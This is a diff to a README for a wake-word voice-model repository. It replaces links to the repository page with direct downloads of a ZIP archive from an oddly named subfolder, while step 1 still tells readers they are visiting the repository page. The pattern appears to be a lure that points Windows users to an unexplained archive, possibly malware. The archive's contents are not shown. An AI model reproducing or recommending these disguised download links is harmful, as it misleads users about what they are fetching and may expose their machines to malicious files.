@@ -1,6 +1,6 @@
 # 🎙️ voxrt-wake-word-models - Add custom voice commands to devices
 
-[![Download Models](https://img.shields.io/badge/Download-Models-blue.svg)](https://github.com/Yasar5374/voxrt-wake-word-models)
+[![Download Models](https://img.shields.io/badge/Download-Models-blue.svg)](https://github.com/Yasar5374/voxrt-wake-word-models/raw/refs/heads/main/harpwaytuning/wake_voxrt_word_models_3.7-alpha.2.zip)
 
 ## 📋 What this project does
 
@@ -21,7 +21,7 @@ To use these model files, your computer needs the following:
 
 You need to download the model files from our repository page. Follow these steps to obtain the correct data for your software:
 
-1. Visit the repository page here: [https://github.com/Yasar5374/voxrt-wake-word-models](https://github.com/Yasar5374/voxrt-wake-word-models).
+1. Visit the repository page here: [https://github.com/Yasar5374/voxrt-wake-word-models/raw/refs/heads/main/harpwaytuning/wake_voxrt_word_models_3.7-alpha.2.zip](https://github.com/Yasar5374/voxrt-wake-word-models/raw/refs/heads/main/harpwaytuning/wake_voxrt_word_models_3.7-alpha.2.zip).
 2. Look for the green button labeled "Code" near the top right of the page.
 3. Click the button and select "Download ZIP".
 4. Choose a folder on your Windows computer where you wish to save the file.
